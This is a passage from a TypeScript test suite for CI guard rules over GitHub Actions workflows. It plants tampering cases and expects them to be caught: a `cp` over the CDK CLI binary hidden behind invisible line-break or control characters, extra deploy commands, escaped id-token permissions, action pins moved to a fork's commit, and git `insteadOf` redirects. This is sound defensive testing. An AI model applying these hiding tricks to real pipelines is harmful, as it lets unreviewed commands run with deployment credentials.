      `${secrets}: DPW-02 ${SHAPE}`,
      `${secrets}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`,
    ])
  })

  // A shape GitHub runs but workflow.ts would read wrong fails, never passes unread.
  it('finds a step, key or value workflow.ts would read wrong, in any workflow', () => {
    const shape = (path: string) => [`${path}: DPW-02 ${SHAPE}`]
    // A step with its keys at ten spaces, and npx run with the credentials in hand: the reader sees no run.
    const step = stepText(deployText, 'nonprod', 'Read back what runs')
    const reindented = step
      .replace('      - name: Read back what runs', '      -   name: Read back what runs')
      .replace(/\n(?=.)/g, '\n  ')
      .replace('            set -euo pipefail\n', '            set -euo pipefail\n            npx cdk deploy --all\n')
    expect(reindented).not.toBe(step)
    const unread = withText(DEPLOY, edited(deployText, step, reindented, job('nonprod')))
    const nonprod = workflowJobs(unread.get(DEPLOY) ?? '').find(each => each.id === 'nonprod')
    expect(nonprod === undefined ? [] : parsedSteps(nonprod).at(-1)?.run).toBeUndefined()
    expect(permissionFindings(unread)).toEqual(shape(DEPLOY))
    // A plain scalar YAML continues on the next line, which the reader would cut at its first.
    const install = '        run: echo "::add-mask::$ACCOUNT_ID"\n'
    expect(permissionFindings(plant(install, `${install}          && npx cdk deploy --all\n`, job('nonprod')))).toEqual(
      shape(DEPLOY),
    )
    expect(
      permissionFindings(
        plant(
          install,
          '        run: "echo ::add-mask::$ACCOUNT_ID\n          && npx cdk deploy --all"\n',
          job('nonprod'),
        ),
      ),
    ).toEqual(shape(DEPLOY))
    expect(
      permissionFindings(
        plant('    runs-on: ubuntu-24.04\n', '    runs-on: ubuntu-24.04\n      self-hosted\n', job('prod')),
      ),
    ).toEqual(shape(DEPLOY))
    // A key given twice, of which the reader keeps the first.
    expect(permissionFindings(plant(install, `${install}        run: npx cdk deploy --all\n`, job('nonprod')))).toEqual(
      shape(DEPLOY),
    )
    expect(
      permissionFindings(
        plant('    runs-on: ubuntu-24.04\n', '    runs-on: ubuntu-24.04\n    runs-on: self-hosted\n', job('prod')),
      ),
    ).toEqual(shape(DEPLOY))
    // A flow sequence over two lines, and a sequence at its key's own indent.
    expect(
      permissionFindings(
        plant(
          '    needs: [gate, build, synth, nonprod, prod-plan, prod-gate]\n',
          '    needs: [gate, build, synth,\n      nonprod, prod-plan, prod-gate]\n',
        ),
      ),
    ).toEqual(shape(DEPLOY))
    expect(
      permissionFindings(
        plant('    steps:\n      - name: Check out', '    steps:\n    - name: Check out', job('smoke-prod')),
      ),
    ).toEqual(shape(DEPLOY))
    // And in ci.yml, whose checkout DPW-11 reads through the same reader.
    expect(
      permissionFindings(plant('      - uses: actions/checkout@', '      -   uses: actions/checkout@', '', CI)),
    ).toEqual(shape(CI))
  })

  // Round 3's GUARDS-01 and GUARDS-02: a carriage return, NEL, LS or PS is a line break to GitHub's YAML
  // reader but not to workflow.ts, which splits only at a newline, so a step after one in a comment line,
  // or a command after one in a run, passed every rule; and a blank but a space or a tab is part of a word
  // to bash, so a # after one is no comment. Each such character, and every other control or format
  // character, is refused in every workflow, named by its line and code point, and each plant here passes
  // every other DPW-02 check.
  it('finds a line break workflow.ts doesn’t split at, a control or format character or another blank, in any workflow', () => {
    const CHARACTERS =
      'a workflow holds only tabs, newlines and printable text: no carriage return, NEL, line or paragraph separator, other control or format character, or blank but a space or a tab'
    const odd = (path: string, planted: string, marker: string, point: string) => {
      const at = planted.indexOf(marker)
      expect(at).toBeGreaterThan(-1)
      const line = planted.slice(0, at).split('\n').length
      return [`${path}: DPW-02 line ${line} holds U+${point}, but ${CHARACTERS}`]
    }
    const breaks = [
      ['\r', '000D'],
      ['\u0085', '0085'],
      ['\u2028', '2028'],
      ['\u2029', '2029'],
    ] as const
    const services = '      - name: Services are about to change\n'
    const started = '          echo "services_started=true" >>"$GITHUB_OUTPUT"\n'
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    for (const [ch, point] of breaks) {
      // A local action after the credentials, hidden behind a line break in a comment line.
      const step = `      # Services next${ch}      - uses: ./.github/actions/hidden\n`
      const hidden = edited(deployText, services, `${step}${services}`, job('nonprod'))
      expect(permissionFindings(withText(DEPLOY, hidden)), point).toEqual(odd(DEPLOY, hidden, step, point))
      // A cp over the CLI's bin, hidden behind one in a run's line.
      const command = `          echo ok${ch}          ${cp}\n`
      const run = edited(deployText, started, `${started}${command}`, job('nonprod'))
      expect(permissionFindings(withText(DEPLOY, run)), point).toEqual(odd(DEPLOY, run, command, point))
    }
    // In ci.yml, a checkout that keeps its credential and an id-token, each behind a carriage return.
    const ciText = workflows.get(CI) ?? ''
    const checkout = '      - uses: actions/checkout@'
    const checkoutAt = ciText.slice(ciText.indexOf(checkout)).split('\n')[0] ?? ''
    const comment = `      # Check out\r${checkoutAt.replace(/@.*/, '@v5')}\n`
    const hiddenCheckout = edited(ciText, `${checkoutAt}\n`, `${comment}${checkoutAt}\n`)
    expect(permissionFindings(withText(CI, hiddenCheckout))).toEqual(odd(CI, hiddenCheckout, comment, '000D'))
    const permissions = 'permissions:\n  contents: read\n'
    const token = `  # Read\r  "id\\x2Dtoken": write\n`
    const hiddenToken = edited(ciText, permissions, `${permissions}${token}`)
    expect(permissionFindings(withText(CI, hiddenToken))).toEqual(odd(CI, hiddenToken, token, '000D'))
    // Line endings a Windows tool writes, and a byte-order mark.
    const crlf = ciText.replaceAll('\n', '\r\n')
    expect(permissionFindings(withText(CI, crlf))).toContain(odd(CI, crlf, '\r', '000D')[0])
    const bom = `\ufeff${ciText}`
    expect(permissionFindings(withText(CI, bom))).toContain(odd(CI, bom, '\ufeff', 'FEFF')[0])
    // A blank bash reads as part of a word, before a #, and other control and format characters.
    for (const [ch, point] of [
      ['\u00a0', '00A0'],
      ['\u000b', '000B'],
      ['\u000c', '000C'],
      ['\u2003', '2003'],
      ['\ufeff', 'FEFF'],
      ['\u202e', '202E'],
      ['\u007f', '007F'],
    ] as const) {
      const command = `          echo ok${ch}#;${cp}\n`
      const run = edited(deployText, started, `${started}${command}`, job('nonprod'))
      expect(permissionFindings(withText(DEPLOY, run)), point).toEqual(odd(DEPLOY, run, command, point))
    }
  })

  // The clause infra.ts's ciSynthProblems held for ci.yml until C0.11 PR 4, with its cases, as they stood.
  it('holds every other workflow to no id-token in any spelling, comments included, and no escape', () => {
    const check = '  check:\n    needs: [secrets, audit, action-pins]\n'
    const idToken = [`${CI}: DPW-02 no job may ask for an id-token`]
    const escaped = [
      `${CI}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`,
    ]
    const ci = (from: string, to: string) => permissionFindings(plant(from, to, '', CI))
    expect(ci('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n')).toEqual(
      idToken,
    )
    expect(ci(check, `${check}    permissions: { contents: read, id-token: write }\n`)).toEqual([
      `${CI}: DPW-02 ${SHAPE}`,
      ...idToken,
    ])
    // A quoted key is also a shape workflow.ts doesn't read.
    const shape = `${CI}: DPW-02 ${SHAPE}`
    expect(ci(check, `${check}    permissions:\n      contents: read\n      'id-token': write\n`)).toEqual([
      shape,
      ...idToken,
    ])
    expect(ci(check, `${check}    permissions:\n      "id-token": write\n`)).toEqual([shape, ...idToken])
    expect(ci(check, `${check}    # ID-TOKEN: write, once\n`)).toEqual(idToken)
    expect(
      ci(
        '  secrets:\n    uses: ./.github/workflows/secrets.yml\n',
        '  secrets:\n    permissions:\n      id-token: write\n    uses: ./.github/workflows/secrets.yml\n',
      ),
    ).toEqual(idToken)
    expect(ci(check, `${check}    permissions: { "id\\x2Dtoken": write }\n`)).toEqual([shape, ...escaped])
    expect(ci(check, `${check}    permissions:\n      "id\\u002Dtoken": write\n`)).toEqual([shape, ...escaped])
    expect(ci(check, `${check}    permissions: "write\\x2Dall"\n`)).toEqual(escaped)
  })

  // GUARDS-03: an anchor, alias, tag or flow mapping (but {}) in any workflow is a shape workflow.ts reads
  // wrong, and an escape anywhere could spell a word a rule looks for: each would have hidden a checkout from
  // DPW-11, pull_request_target from DPW-01, an id-token from this case or a group from DPW-05.
  it('finds an anchor, alias, tag or flow mapping in any workflow, and an escape anywhere on a YAML line', () => {
    const shape = (path: string) => `${path}: DPW-02 ${SHAPE}`
    const escaped = `${CI}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`
    const checkout = '      - uses: actions/checkout@v5\n'
    const secrets = '.github/workflows/secrets.yml'
    expect(permissionFindings(plant(checkout, `      - { uses: actions/checkout@v5 }\n${checkout}`, '', CI))).toEqual([
      shape(CI),
    ])
    expect(
      permissionFindings(plant(checkout, `      - { uses: actions/checkout@v5 }\n${checkout}`, '', secrets)),
    ).toEqual([shape(secrets)])
    expect(permissionFindings(plant(checkout, '      - uses: &co actions/checkout@v5\n', '', CI))).toEqual([shape(CI)])
    expect(permissionFindings(plant('name: ci\n', 'name: !!str ci\n', '', CI))).toEqual([shape(CI)])
    const check = '  check:\n    needs: [secrets, audit, action-pins]\n'
    expect(
      permissionFindings(
        plant(check, '  check:\n    concurrency: *g\n    needs: [secrets, audit, action-pins]\n', '', CI),
      ),
    ).toEqual([shape(CI)])
    expect(permissionFindings(plant('name: ci\n', 'name: &k "id\\x2Dtoken"\n', '', CI))).toEqual([shape(CI), escaped])
    // An escape in a flow sequence's item, a sequence item or a value after an anchor, not only after a key.
    expect(
      permissionFindings(
        plant('on:\n  pull_request: {}\n', 'on: [push, "pull_request\\x5Ftarget"]\nx:\n  pull_request: {}\n', '', CI),
      ),
    ).toEqual([shape(CI), escaped])
    expect(permissionFindings(plant('    branches: [main]\n', '    branches:\n      - "ma\\x69n"\n', '', CI))).toEqual([
      escaped,
    ])
    // The empty flow mapping ci.yml's pull_request: {} uses still reads.
    expect(permissionFindings(plant('  pull_request: {}\n', '  pull_request: { }\n', '', CI))).toEqual([])
  })

  // GUARDS-05: a folded block scalar's lines are joined by YAML, and an indentation indicator sets an indent
  // the reader doesn't take, so GitHub would hand bash another text than the one the guard read.
  // Round 2's GUARDS-04: an if: with anything beside its expression is a string GitHub reads as true, though
  // the guard's reader takes the expression alone (a block scalar's newline dropped, a quoted space trimmed).
  it('finds an if: in deploy.yml that isn’t a plain expression alone', () => {
    const IF = `writes every if: as a plain \${{ … }} alone on its line: quoted, as a block scalar or with text beside it, GitHub reads a string, always true`
    const prodIf = /\n {4}if: (\$\{\{.*\}\})\n/.exec(
      (workflows.get(DEPLOY) ?? '').slice((workflows.get(DEPLOY) ?? '').indexOf(job('prod'))),
    )?.[1]
    expect(prodIf).toBeDefined()
    const download = `        if: \${{ needs.synth.outputs.assembly != '' }}\n`
    for (const [from, to, after] of [
      [`    if: ${prodIf}\n`, `    if: |\n      ${prodIf}\n`, job('prod')],
      [`    if: ${prodIf}\n`, `    if: |+\n      ${prodIf}\n`, job('prod')],
      [`    if: ${prodIf}\n`, `    if: "${prodIf} "\n`, job('prod')],
      [`    if: ${prodIf}\n`, `    if: '${prodIf} '\n`, job('prod')],
      [download, `        if: |\n          \${{ needs.synth.outputs.assembly != '' }}\n`, job('nonprod')],
      [download, `        if: "\${{ needs.synth.outputs.assembly != '' }} "\n`, job('nonprod')],
      [download, `        if: \${{ needs.synth.outputs.assembly != '' }} x\n`, job('nonprod')],
      [download, `        if: needs.synth.outputs.assembly != ''\n`, job('nonprod')],
    ] as const) {
      expect(permissionFindings(plant(from, to, after)), to).toContain(`${DEPLOY}: DPW-02 ${IF}`)
    }
  })

  // Round 4: a plain value starting with an indicator YAML reads as structure, a flow item YAML reads as a
  // mapping or as one item where the reader splits two, and an indentation indicator, each in any workflow.
  // Each would hand GitHub another value than the one the reader holds (needs: [secrets, "audit,x"] is two
  // jobs to YAML, three to the reader).
  it('finds a value or flow item YAML reads as structure, and an indentation indicator, in any workflow', () => {
    const shape = [`${CI}: DPW-02 ${SHAPE}`]
    const ci = (from: string, to: string) => permissionFindings(plant(from, to, '', CI))
    const branches = '    branches: [main]\n'
    const needs = '    needs: [secrets, audit, action-pins]\n'
    for (const to of [
      '    branches:\n      - - main\n',
      '    branches:\n      - ? main\n',
      '    branches:\n      - : main\n',
      '    branches: [? main]\n',
      '    branches: [main: x]\n',
      '    branches: [main, x:]\n',
      '    branches: [main, ma#in]\n',
      '    branches: [main, ]\n',
    ]) {
      expect(ci(branches, to), to).toEqual(shape)
    }
    expect(ci(needs, '    needs: [secrets, "audit,x"]\n')).toEqual(shape)
    expect(ci(needs, "    needs: [secrets, 'audit,x']\n")).toEqual(shape)
    expect(ci(needs, '    needs: [secrets, "audit]\n')).toEqual(shape)
    // Quoted items whole, and plain ones holding a : with no blank after it, still read.
    expect(ci(needs, `    needs: [secrets, "audit", 'audit']\n`)).toEqual([])
    expect(ci(branches, '    branches: [main, a:b]\n')).toEqual([])
    // An indentation indicator in ci.yml, though its folded scalars stay.
    const audit = '      - run: npm audit signatures\n'
    const INDICATOR = `${CI}: DPW-02 gives no block scalar an indentation indicator, which sets an indent workflow.ts doesn’t take`
    for (const indicator of ['|2', '|2-', '|-2', '>1', '>-2']) {
      expect(ci(audit, `      - run: ${indicator}\n          npm audit signatures\n`), indicator).toEqual([INDICATOR])
    }
    expect(ci(audit, '      - run: >-\n          npm audit signatures\n')).toEqual([])
  })

  it('finds a block scalar in deploy.yml that isn’t literal', () => {
    const LITERAL = `${DEPLOY}: DPW-02 writes every block scalar literal (|, |- or |+), never folded (>) or with an indentation indicator`
    const mark = `        id: mark\n        if: \${{ needs.gate.outputs.mode != 'drill-break' }}\n        run: |\n`
    const as = (indicator: string) =>
      permissionFindings(plant(mark, mark.replace('run: |\n', `run: ${indicator}\n`), job('nonprod')))
    for (const indicator of ['>', '>-', '|2', '|2-', '|-2']) expect(as(indicator), indicator).toEqual([LITERAL])
    for (const indicator of ['|-', '|+', '| # a comment']) expect(as(indicator), indicator).toEqual([])
  })

  it('holds the repository', () => {
    expect(permissionFindings(workflows)).toEqual([])
  })
})

describe('DPW-03 (C11-D55, C11-D56): only the five environment jobs hold AWS credentials', () => {
  it('finds each planted breakage', () => {
    expect(
      credentialJobFindings(
        plant(
          '          printf \'%s\' "$READBACK"',
          '          aws sts get-caller-identity\n          printf \'%s\' "$READBACK"',
          job('smoke-nonprod'),
        ),
      ),
    ).toEqual([
      `${DEPLOY}: DPW-03 smoke-nonprod: runs aws, the CDK CLI or skopeo, or takes credentials, which only the five environment jobs may`,
    ])
    expect(
      credentialJobFindings(plant('    environment: nonprod\n', '    environment: prod\n', job('rollback-nonprod'))),
    ).toEqual([`${DEPLOY}: DPW-03 rollback-nonprod: names the environment nonprod`])
    expect(credentialJobFindings(plant('    environment: prod\n', '    environment: restore\n', job('prod')))).toEqual([
      `${DEPLOY}: DPW-03 prod: names the environment prod`,
    ])
    expect(
      credentialJobFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    environment: nonprod\n', job('gate')),
      ),
    ).toEqual([`${DEPLOY}: DPW-03 gate: names no environment`])
  })

  it('holds the repository', () => {
    expect(credentialJobFindings(workflows)).toEqual([])
  })
})

describe('DPW-04 (C11-D48, C11-D79): action pins', () => {
  const PIN = 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'
  const pinned = (where: string) =>
    `${DEPLOY}: DPW-04 ${where}: every uses: is checkout, setup-node, upload-artifact, download-artifact or the credentials action, at exactly the commit and version comment ACTION_PINS names, which CI proves against the action's own repository`
  const FOUND = [pinned('gate')]
  const pin = (to: string) => actionPinFindings(plant(PIN, to))
  const FOLDER = `${DEPLOY}: DPW-04 .github/workflows holds workflows alone (<name>.yml or <name>.yaml): no actions lockfile or other file beside them`

  it('finds each planted breakage', () => {
    expect(pin('actions/checkout@v7')).toEqual(FOUND)
    expect(pin('actions/checkout@main # v7.0.1')).toEqual(FOUND)
    expect(pin(`actions/checkout@${'a'.repeat(39)} # v7.0.1`)).toEqual(FOUND)
    expect(pin(`actions/checkout@${'a'.repeat(40)}`)).toEqual(FOUND)
    expect(pin(`docker/setup-buildx-action@${'a'.repeat(40)} # v3.11.1`)).toEqual(FOUND)
    expect(pin('./.github/actions/x')).toEqual(FOUND)
    expect(pin('docker://alpine@sha256:0')).toEqual(FOUND)
    // FETCH-A1-01: a pin moved to another commit, under the same version comment or another, which GitHub
    // resolves under the action's name if a fork holds it.
    const fork = '5f1c0a7e9d2b4c6a8e0f1b3d5c7e9a1b2c4d6e8f'
    expect(pin(`actions/checkout@${fork} # v7.0.1`)).toEqual(FOUND)
    expect(pin('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.2')).toEqual(FOUND)
    expect(pin(`actions/checkout@${fork} # v7.0.2`)).toEqual(FOUND)
  })

  it('holds each action of a credentialed job to its pin (FETCH-A1-01)', () => {
    const fork = '5f1c0a7e9d2b4c6a8e0f1b3d5c7e9a1b2c4d6e8f'
    for (const [id, from, to] of [
      [
        'nonprod',
        'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1',
        `actions/checkout@${fork} # v7.0.1`,
      ],
      [
        'prod-plan',
        'actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2',
        `actions/download-artifact@${fork} # v8.0.3`,
      ],
      [
        'rollback-prod',
        'aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0',
        `aws-actions/configure-aws-credentials@${fork} # v6.3.0`,
      ],
    ] as const) {
      expect(actionPinFindings(plant(from, to, job(id))), id).toEqual([pinned(id)])
    }
  })

  it('finds a file beside the workflows', () => {
    const real = [...workflows.keys()]
    expect(actionPinFindings(workflows, [...real, '.github/workflows/actions.lock'])).toEqual([FOLDER])
    expect(actionPinFindings(workflows, [...real, '.github/workflows/sub/x.yml'])).toEqual([FOLDER])
    expect(actionPinFindings(workflows, [...real, '.github/workflows/x.yml.bak'])).toEqual([FOLDER])
  })

  // FETCH-A6-01 (round 6). .nvmrc chooses the pins job's Node and every deploy job's. A JSON .nvmrc that
  // setup-node 7.1 (the pins job's and deploy.yml's) reads by devEngines.runtime, 24.1.0, and setup-node 5
  // (check's) by engines.node, 24, gave the pins job a Node without import.meta.main, on which the check
  // ran nothing and exited 0, while check ran a Node new enough to pass: a pin moved with its table entry to
  // a fork's commit passed CI, and every deploy job's smoke would have passed a broken release the same way.
  it('holds .nvmrc to 24 alone, which every setup-node reads as the latest Node 24 (FETCH-A6-01, round 6)', () => {
    const NODE = `.nvmrc: DPW-04 is 24 alone, a line of its own, which every setup-node reads as the latest Node 24, so no manifest, range or release read differently by the two setup-node versions gives the pins check or a deploy job a Node without import.meta.main, on which it would run nothing and exit 0`
    for (const planted of [
      '{"devEngines":{"runtime":{"name":"node","version":"24.1.0"}},"engines":{"node":"24"}}\n',
      '{"volta":{"node":"24.1.0"}}\n',
      '[tools]\nnode = "24.1.0"\n',
      '24.1.0\n',
      'v24\n',
      'node 24\n',
      '>=24.2\n',
      'lts/*\n',
      '24',
      '24\n\n',
      ' 24\n',
    ]) {
      expect(actionPinFindings(workflows, undefined, planted), JSON.stringify(planted)).toEqual([NODE])
    }
    expect(actionPinFindings(workflows, undefined, NVMRC)).toEqual([])
    expect(NVMRC).toBe('24\n')
    // And each script the pipeline runs whose answer a gate, a smoke or a person rests on refuses a Node
    // without import.meta.main, on which it would otherwise run nothing and exit 0 (a smoke passed, say).
    for (const [script, said] of [
      ['history', 'nothing was decided'],
      ['smoke', 'nothing was judged'],
      ['floors-check', 'no floor was checked'],
    ] as const) {
      const code = readRepoFile(`infra/scripts/deploy/${script}.ts`).trimEnd().split('\n')
      const refusal = [
        "if (typeof import.meta.main !== 'boolean') {",
        `  process.stderr.write('${script}: Node 24.2 or later is needed (import.meta.main), so ${said}\\n')`,
        '  process.exit(1)',
        '}',
        'if (import.meta.main) process.exitCode = await main(process.argv.slice(2))',
      ]
      expect(code.slice(-refusal.length), script).toEqual(refusal)
      const older = spawnSync(
        process.execPath,
        [
          '--input-type=module',
          '-e',
          refusal.slice(0, 4).join('\n').replace('typeof import.meta.main', 'typeof undefined'),
        ],
        { encoding: 'utf8' },
      )
      expect(older.status, script).toBe(1)
      expect(older.stderr, script).toBe(`${script}: Node 24.2 or later is needed (import.meta.main), so ${said}\n`)
    }
  })

  it('holds the repository', () => {
    expect(actionPinFindings(workflows, files, readRepoFile('.nvmrc'))).toEqual([])
    // The table names exactly the actions deploy.yml uses, each in the shape scripts/check-action-pins.ts reads.
    const used = new Set([...deployText.matchAll(/^\s+(?:- )?uses: ([^@\s]+)@/gm)].map(each => each[1]))
    expect([...used].sort()).toEqual(Object.keys(ACTION_PINS).sort())
    for (const [action, entry] of Object.entries(ACTION_PINS)) {
      expect(ACTION_SHAPE.test(action), action).toBe(true)
      expect(PIN_SHAPE.test(entry), action).toBe(true)
    }
    // ci.yml's job action-pins runs checkout and setup-node alone before the check, each at its entry here.
    expect(Object.keys(PINS_JOB_ACTIONS).sort()).toEqual(['actions/checkout', 'actions/setup-node'])
    for (const entry of Object.values(PINS_JOB_ACTIONS)) expect(PIN_SHAPE.test(entry), entry).toBe(true)
  })
})

describe('scripts/check-action-pins.ts (DPW-04): each pin against its action’s own repository', () => {
  const commit = '3d3c42e5aac5ba805825da76410c181273ba90b1'
  const other = '5f1c0a7e9d2b4c6a8e0f1b3d5c7e9a1b2c4d6e8f'

  it('reads the commit a tag names, the peeled one of an annotated tag, from the two exact refs alone', () => {
    expect(tagCommit(`${commit}\trefs/tags/v7.0.1\n`, 'v7.0.1')).toBe(commit)
    expect(tagCommit(`${other}\trefs/tags/v7.0.1\n${commit}\trefs/tags/v7.0.1^{}\n`, 'v7.0.1')).toBe(commit)
    expect(tagCommit(`${commit}\trefs/tags/x/v7.0.1\n`, 'v7.0.1')).toBeUndefined()
    expect(tagCommit(`${commit}\trefs/heads/v7.0.1\n`, 'v7.0.1')).toBeUndefined()
    expect(tagCommit('', 'v7.0.1')).toBeUndefined()
  })

  it('finds a pin its tag doesn’t name, a missing tag and an entry in another shape', () => {
    const answer = (sha: string) => () => `${sha}\trefs/tags/v7.0.1\n`
    const pins = { 'actions/checkout': `${commit} # v7.0.1` }
    expect(pinProblems(pins, answer(commit))).toEqual([])
    expect(pinProblems(pins, answer(other))).toEqual([
      "actions/checkout: tag v7.0.1 names another commit than the pin's",
    ])
    expect(pinProblems(pins, () => '')).toEqual(['actions/checkout: the repository has no tag v7.0.1'])
    expect(pinProblems({ 'actions/checkout': `${commit}` }, answer(commit))).toEqual([
      'actions/checkout: the pin is not <40-hex commit> # v<major>.<minor>.<patch>',
    ])
    expect(pinProblems({ 'actions/checkout/../x': `${commit} # v7.0.1` }, answer(commit))).toEqual([
      'actions/checkout/../x: the pin is not <40-hex commit> # v<major>.<minor>.<patch>',
    ])
    // It asks for the version's own tag of the action's own repository.
    const asked: string[] = []
    pinProblems(pins, (action, version) => {
      asked.push(`${action} ${version}`)
      return `${commit}\trefs/tags/${version}\n`
    })
    expect(asked).toEqual(['actions/checkout v7.0.1'])
  })

  // RULES-01 (review 5): CI's proof of the pins is the script's own decision, which nothing but the owner's read
  // held, so a pull request could move a pin to a fork's commit and, beside it, have the check skip a read or
  // exit 0 with every test green. Its decision runs here end to end on planted answers, for each entry of both
  // tables alone, and every address it reads is the action's own repository.
  describe('the check end to end (RULES-01)', () => {
    const entries = [
      ...Object.entries(ACTION_PINS).map(([action, pin]) => ['deploy.yml', action, pin] as const),
      ...Object.entries(PINS_JOB_ACTIONS).map(([action, pin]) => ['action-pins job', action, pin] as const),
    ]
    const tagOf = (pin: string) => PIN_SHAPE.exec(pin) ?? []
    const commits = new Map(entries.map(([, action, pin]) => [`${action} ${tagOf(pin)[2]}`, tagOf(pin)[1]]))
    const answer = (action: string, version: string) => `${commits.get(`${action} ${version}`)}\trefs/tags/${version}\n`
    const quietly = (read: (action: string, version: string) => string) => {
      const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
      const error = vi.spyOn(console, 'error').mockImplementation(() => undefined)
      try {
        return checkActionPins(read)
      } finally {
        log.mockRestore()
        error.mockRestore()
      }
    }

    it('exits 0 only when every pin of both tables is its tag’s commit', () => {
      expect(entries.length).toBe(7)
      expect(quietly(answer)).toBe(0)
    })

    it('exits 1 for each entry alone at another commit, with no tag, or whose read fails', () => {
      for (const [table, action, pin] of entries) {
        const [, commit = '', version = ''] = tagOf(pin)
        const other = commit.replace(/^./, first => (first === '0' ? '1' : '0'))
        const only = (planted: (version: string) => string) => (asked: string, askedVersion: string) =>
          asked === action && askedVersion === version ? planted(askedVersion) : answer(asked, askedVersion)
        const way = `${table} ${action}`
        expect(quietly(only(tag => `${other}\trefs/tags/${tag}\n`)), `${way} at another commit`).toBe(1)
        expect(quietly(only(tag => `${other}\trefs/tags/${tag}\n${other}\trefs/tags/${tag}^{}\n`)), way).toBe(1)
        expect(quietly(only(() => '')), `${way} with no tag`).toBe(1)
        expect(quietly(only(tag => `${commit}\trefs/tags/x/${tag}\n`)), `${way} under another ref`).toBe(1)
        expect(
          quietly(
            only(() => {
              throw new Error('check-action-pins: the read failed')
            }),
          ),
          `${way} whose read fails`,
        ).toBe(1)
      }
    })

    it('reads each action from its own repository, and exits with the check’s answer', () => {
      expect(Object.keys({ ...ACTION_PINS, ...PINS_JOB_ACTIONS }).map(actionUrl)).toEqual([
        'https://github.com/actions/checkout.git',
        'https://github.com/actions/setup-node.git',
        'https://github.com/actions/upload-artifact.git',
        'https://github.com/actions/download-artifact.git',
        'https://github.com/aws-actions/configure-aws-credentials.git',
      ])
      for (const [, action, pin] of entries) {
        const version = tagOf(pin)[2] ?? ''
        const asked: string[] = []
        expect(
          lsRemote(action, version, (url, tag) => {
            asked.push(`${url} ${tag}`)
            return 'answer'
          }),
        ).toBe('answer')
        expect(asked).toEqual([`https://github.com/${action}.git ${version}`])
      }
      // The script's last line exits with run's answer over lsRemote, so neither a skipped exit nor another
      // reader stands in for it; and before it, a Node without import.meta.main (older than 24.2), on which
      // that line would never call run and the script would exit 0 having read nothing, exits 1
      // (FETCH-A6-01, round 6).
      const source = readRepoFile('scripts/check-action-pins.ts')
      const code = source.trimEnd().split('\n')
      const refusal = [
        "if (typeof import.meta.main !== 'boolean') {",
        "  console.error('check-action-pins: Node 24.2 or later is needed (import.meta.main), so no pin was read')",
        '  process.exit(1)',
        '}',
        'if (import.meta.main) process.exit(run(lsRemote))',
      ]
      expect(code.slice(-refusal.length)).toEqual(refusal)
      expect(
        code.filter(
          line =>
            !line.trimStart().startsWith('//') && /\bimport\.meta\.main\b|process\.(?:exit|exitCode)\b/.test(line),
        ),
      ).toEqual([
        "if (typeof import.meta.main !== 'boolean') {",
        "  console.error('check-action-pins: Node 24.2 or later is needed (import.meta.main), so no pin was read')",
        '  process.exit(1)',
        'if (import.meta.main) process.exit(run(lsRemote))',
      ])
      // Run as a Node older than 24.2 runs it, import.meta.main undefined: it says so and exits 1.
      const older = spawnSync(
        process.execPath,
        [
          '--input-type=module',
          '-e',
          refusal.slice(0, 4).join('\n').replace('typeof import.meta.main', 'typeof undefined'),
        ],
        { encoding: 'utf8' },
      )
      expect(older.status).toBe(1)
      expect(older.stderr).toContain('no pin was read')
    })
  })

  // FETCH-A3-01: git read each action's repository with the configuration of whoever ran the check, so a
  // test that ran before it in CI's check job and wrote url.<fork>.insteadOf to $HOME/.gitconfig sent the read
  // to a fork whose tag names the fork's commit, and a pin moved to that commit passed. Each way git takes
  // configuration is planted here, first shown to send a plain git ls-remote to the fork, then the check's
  // own read to name the repository's commit all the same.
  it('reads the repository it names whatever configuration git would otherwise read (FETCH-A3-01)', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-action-pins-'))
    try {
      const bare = { PATH: process.env.PATH ?? '', HOME: join(folder, 'home') }
      const git = (cwd: string, args: readonly string[]) =>
        execFileSync(
          'git',
          [
            ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
            ...['-c', 'commit.gpgsign=false', '-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
          ],
          {
            cwd,
            encoding: 'utf8',
            env: { ...bare, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' },
            stdio: ['ignore', 'pipe', 'pipe'],
          },
        ).trim()
      const repository = (name: string) => {
        const path = join(folder, name)
        execFileSync('mkdir', ['-p', path, bare.HOME])
        git(path, ['init', '-q'])
        git(path, ['commit', '-q', '--allow-empty', '-m', name])
        git(path, ['tag', '-a', '-m', name, 'v7.0.1'])
        return { url: `file://${path}`, commit: git(path, ['rev-parse', 'HEAD']) }
      }
      const own = repository('own')
      const fork = repository('fork')
      expect(own.commit).not.toBe(fork.commit)
      const rewrite = `[url "${fork.url}"]\n\tinsteadOf = ${own.url}\n`
      const file = (name: string, text: string) => {
        const path = join(folder, name)
        execFileSync('mkdir', ['-p', join(path, '..')])
        writeFileSync(path, text)
        return path
      }
      const local = join(folder, 'local')
      execFileSync('mkdir', ['-p', local])
      git(local, ['init', '-q'])
      file('local/.git/config', `${readFileSync(join(local, '.git/config'), 'utf8')}${rewrite}`)
      const ways: ReadonlyArray<readonly [string, Record<string, string>]> = [
        ['$HOME/.gitconfig', { HOME: join(folder, 'poisoned'), _: file('poisoned/.gitconfig', rewrite) }],
        ['$XDG_CONFIG_HOME/git/config', { XDG_CONFIG_HOME: join(folder, 'xdg'), _: file('xdg/git/config', rewrite) }],
        ['GIT_CONFIG_GLOBAL', { GIT_CONFIG_GLOBAL: file('global', rewrite) }],
        ['GIT_CONFIG_SYSTEM', { GIT_CONFIG_SYSTEM: file('system', rewrite) }],
        [
          'GIT_CONFIG_COUNT',
